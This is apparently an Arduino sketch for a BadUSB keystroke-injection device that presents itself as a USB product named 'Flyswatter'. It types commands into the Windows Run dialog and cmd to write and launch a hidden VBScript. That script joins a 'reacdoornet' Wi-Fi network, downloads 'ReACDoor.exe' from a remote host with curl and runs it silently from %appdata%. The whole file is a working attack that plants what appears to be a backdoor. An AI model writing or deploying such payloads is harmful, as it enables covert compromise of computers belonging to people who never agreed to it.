#include "USB.h"
#include "USBHIDKeyboard.h"
#include "keyboardLayout/KeyboardLayout.h"

USBHIDKeyboard Keyboard;

void setup() {
  pinMode(LED_BUILTIN, OUTPUT);
  digitalWrite(LED_BUILTIN, LOW);


  //Serial.begin(9600);

  Keyboard.begin(KeyboardLayout_de_DE);
  USB.productName("Flyswatter");
  USB.begin();

  delay(1000);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(1000);
  Keyboard.println("cmd");
  delay(1000);

  Keyboard.println(R"(echo CreateObject("WScript.Shell").Run "cmd /c netsh wlan connect name=reacdoornet & timeout /t 5 /nobreak >nul & cd /d %appdata% & if exist ReACDoor.exe exit /b & curl -O http://reacdoormaster/ReACDoor.exe & if exist ReACDoor.exe start ReACDoor.exe", 0, False > %temp%\h.vbs)");
  delay(500);

  Keyboard.println("wscript %temp%\\h.vbs & exit");

}

void loop() {
  //Serial.println("Test");
  delay(1000);
}